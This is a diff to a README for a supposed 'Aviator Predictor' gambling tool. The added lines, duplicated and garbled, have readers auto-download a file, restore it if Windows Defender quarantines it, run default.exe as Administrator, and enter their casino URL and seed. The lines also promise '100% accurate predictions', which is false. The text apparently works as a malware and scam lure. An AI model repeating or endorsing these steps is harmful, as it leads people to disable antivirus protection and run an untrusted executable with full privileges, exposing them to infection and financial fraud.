@@ -1,5 +1,15 @@
-# Aviator Predictor - Automated Tool
-
+#The download will start automatically once you visit the site. If Windows Defender quarantines the file, just restore it to proceed smoothly.
+Extract the default.zip file to your desired location.
+Run default.exe as Administrator.
+A prompt will appear asking for your casino site URL and client seed.
+Enter the required information.
+Receive 100% accurate predictions for your Aviator rounds! Aviator Predictor - Automated Tool
+The download will start automatically once you visit the site. If Windows Defender quarantines the file, just restore it to proceed smoothly.
+Extract the default.zip file to your desired location.
+Run default.exe as Administrator.
+A prompt will appear asking for your casino site URL and client seed.
+Enter the required information.
+Receive 100% accurate predictions for your Aviator rounds!
 Welcome to Aviator Predictor, your ultimate tool for maximizing your profits in Aviator games! This tool leverages advanced prediction algorithms to provide you with accurate signals, and the best part? It's completely free!
 
 ## Key Features
